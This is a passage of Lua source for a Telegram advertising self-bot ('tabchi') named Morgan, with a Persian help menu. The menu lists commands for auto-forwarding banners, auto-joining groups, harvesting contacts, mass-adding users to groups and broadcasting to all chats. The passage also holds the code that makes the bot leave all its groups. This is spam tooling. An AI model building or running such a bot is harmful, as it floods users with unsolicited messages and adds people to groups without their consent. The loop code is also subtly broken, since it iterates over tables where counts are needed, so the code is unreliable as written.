send_msg(msg.chat_id,"» ربات با موفقیت بروز شد",msg.id) 
end
if msg.content.text == "راهنما" and is_admin(msg) then 
local help = [[
                
   🎭راهنمای استفاده از ربات تبلیغاتی مورگان™🎭

*-*-*-*-*-*-*-*-*-*-*-*-*-*
                
 🔹 انتخاب بنر [+/-] 
#جهت انتخاب بنر فوروارد 🔖
•°•°•°•°•°•°•°•°•°•°•°•°•°
  🔹 فوروارد خودکار [روشن/خاموش]
#جهت فعال کردن فوروارد خودکار ✅
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 زمان فوروارد [عدد برحسب ثانیه]
#جهت تنظیم زمان فوروارد خودکار♻️
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 وضعیت 
#جهت با خبر شدن از تنظیمات تبچی⛓
•°•°•°•°•°•°•°•°•°•°•°•°•°
 🔹 خروج از کانال [روشن/خاموش]
#جهت لفت دادن یا ندادن ربات از کانال هایی که جوین میشود🆑
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 انلاینی
#جهت با خبر شدن از انلاین بودن ربات🤖
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 ریلود
#جهت بروزرسانی کردن فایل های تبچی🗞
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔸 امار 
#جهت دریافت تعداد دقیق امار تبلیغاتی📈
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 ذخیره مخاطب [روشن/خاموش]
#جهت روشن کردن حالت ذخیره مخاطبین👥
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔸 جوینر [روشن/خاموش]
#جهت جوین شدن خودکار تبلیغاتی به گروه ها ♋️
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 بازشماری
#جهت بروزرسانی کردن امار تبلیغاتی 📊
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔸 اددکن 
#جهت افزودن مخاطب های ربات به گروه 👥
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 افزودن به همه
#جهت افزودن کاربر به تمام گروه های تبلیغاتی 🤕
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔸 خام سازی
#جهت خروج ربات از گروه و سوپرگروه ها 🤧
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹 ارتقا {ایدی}
#جهت ارتقا کاربر به مدیر ربات👤
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔸 فوروارد به [پیوی/گروه/سوپرگروه/همه]
#جهت فوروارد پیام به بخش مورد نظر 👨‍👩‍👧‍👦
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔹عزل [ایدی]
#جهت عزل ادمین از مقام ادمینی👤
•°•°•°•°•°•°•°•°•°•°•°•°•°
🔶 خاموش شو
#جهت خاموش شدن ربات به مدت 30 دقیقه ⏯
•°•°•°•°•°•°•°•°•°•°•°•°•°
<🔸 آپدیت 
#جهت ارتقا به اخرین نسخه تبلیغاتی مورگان📝
^_^_^_^_^_^_^_^_^_^

Version:
1.0
Developer: 
[‌@SHIEKH_MAMAD‌] [‌@mr_mamad_seller‌]
Our channel: {‌@MORGAN_TeaM‌}
Our site: { morgancloud.ir }         

]] 
send_msg(msg.chat_id,help,msg.id) 
end 
if msg.content.text == 'خام سازی' and is_admin(msg) then 
local lgp = redis:smembers(Morgannum.."tabchi_gp") 
local lsug = redis:smembers(Morgannum.."tabchi_sugp") 
local lgpn = redis:scard(Morgannum.."tabchi_gp") 
local lsugn = redis:scard(Morgannum.."tabchi_sugp") 
for i=1 , lgp do 
openChat(lgp[i], dl_cb, nil)
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(lgp[i]),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
end 
for i=1 , lsug do 
openChat(lsug[i], dl_cb, nil)
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(lsug[i]),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
end 
send_msg(msg.chat_id,"» در حال انجام عملیات خام سازی  ",msg.id) 
end 
if msg.content.text == "خاموش شو" and is_admin(msg) then 
redis:setex(Morgannum.."tab_sleep",2000,true) 
send_msg(msg.chat_id,"ربات تا (* نیم ساعت*) خاموش شد",msg.id) 
        end 
      end 
    end 
 end
